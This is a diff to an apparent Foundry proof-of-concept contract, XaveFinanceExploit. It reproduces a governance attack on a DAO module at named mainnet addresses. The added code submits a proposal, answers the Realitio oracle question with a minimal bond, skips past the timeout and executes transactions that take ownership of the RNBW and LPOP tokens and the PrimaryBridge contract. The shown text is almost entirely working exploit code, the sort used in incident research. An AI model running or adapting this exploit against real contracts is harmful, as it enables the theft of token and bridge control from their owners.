@@ -16,6 +16,16 @@ interface IDaoModule {
     function executeProposalWithIndex(string memory proposalId, bytes32[] memory txHashes, address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 txIndex) external;
 
     function addProposal(string memory proposalId, bytes32[] memory txHashes) external;
+
+    function buildQuestion(string memory proposalId, bytes32[] memory txHashes) external pure returns(string memory);
+
+    function questionIds (bytes32) external returns (bytes32);
+}
+
+interface IRealitio {
+  function submitAnswer(bytes32 question_id, bytes32 answer, uint256 max_previous) external payable;
+
+  function isFinalized(bytes32 question_id) view external returns (bool);
 }
 
 interface IPrimaryBridge{
@@ -30,6 +40,7 @@ contract XaveFinanceExploit is DSTest {
     IERC20 LPOP = IERC20(0x6335A2E4a2E304401fcA4Fc0deafF066B813D055);
     IPrimaryBridge PrimaryBridge =  IPrimaryBridge(0x579270F151D142eb8BdC081043a983307Aa15786);
     IDaoModule daoModule = IDaoModule(0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F);
+    IRealitio realitio = IRealitio (0x325a2e0F3CCA2ddbaeBB4DfC38Df8D19ca165b47);
 
     address attacker = 0x0f44f3489D17e42ab13A6beb76E57813081fc1E2;
     address attackerContract = 0xE167cdAAc8718b90c03Cf2CB75DC976E24EE86D3;
@@ -98,11 +109,17 @@ contract XaveFinanceExploit is DSTest {
         
         //the txIDs generated using getTransactionHash
         bytes32[] memory txIDs = new bytes32[](4);  
-        txIDs[0] = 0x920be15788d94a0bee09f9f7bcbdad2e47ef4a59f684d9bb06b657083e576c0a;
-        txIDs[1] = 0xa76f7716abd0c04dcd5e627b349fea606f0133d93ce8381d450e976b6ef7b9ca;
-        txIDs[2] = 0xe99095062d9e0d131e25a230c8a84345b37b979bd6f7b0b9e1850a0847339b6d;
-        txIDs[3] = 0x14f07b03beee17f568bdb8627c3a521b1a7c99cd7abcafec9a015d93c3fb9293;
+        txIDs[0] = tx0;
+        txIDs[1] = tx1;
+        txIDs[2] = tx2;
+        txIDs[3] = tx3;
         
+        daoModule.addProposal("2", txIDs);
+        string memory q = daoModule.buildQuestion("2", txIDs);
+        bytes32 qID = daoModule.questionIds(keccak256(bytes(q)));
+        realitio.submitAnswer{value: 1}(qID, bytes32(uint256(1)), 0);
+        cheats.warp(block.timestamp + 24 * 60 * 60);
+
         emit log_named_address("[Before proposal Execution] Owner of $RNBW: ", RNBW.owner());
         emit log_named_address("[Before proposal Execution] Owner of $LPOP: ", LPOP.owner());
         emit log_named_address("[Before proposal Execution] Owner of PrimaryBridge: ", PrimaryBridge.owner());
